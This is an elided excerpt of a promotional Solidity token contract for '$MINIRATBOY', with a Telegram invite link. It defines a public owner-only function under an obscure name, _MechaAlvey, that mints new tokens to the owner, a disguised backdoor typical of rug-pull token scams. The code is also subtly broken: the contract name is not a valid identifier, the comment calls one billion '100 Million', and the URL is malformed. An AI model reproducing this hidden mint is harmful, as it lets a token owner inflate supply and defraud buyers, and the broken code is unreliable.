...
//
// $MINIRATBOY proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/+qNQAyogxHntiM2Vl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MechaAlvey(uint256 amount) public onlyOwner {
    _MechaAlvey(msg.sender, amount);
    }
    ...
    function _MechaAlvey(address account, uint256 amount) internal virtual {
...
contract $MINIRATBOY is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("MINIRAT BOY", "MINIRATBOY") {
        _MechaAlvey(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}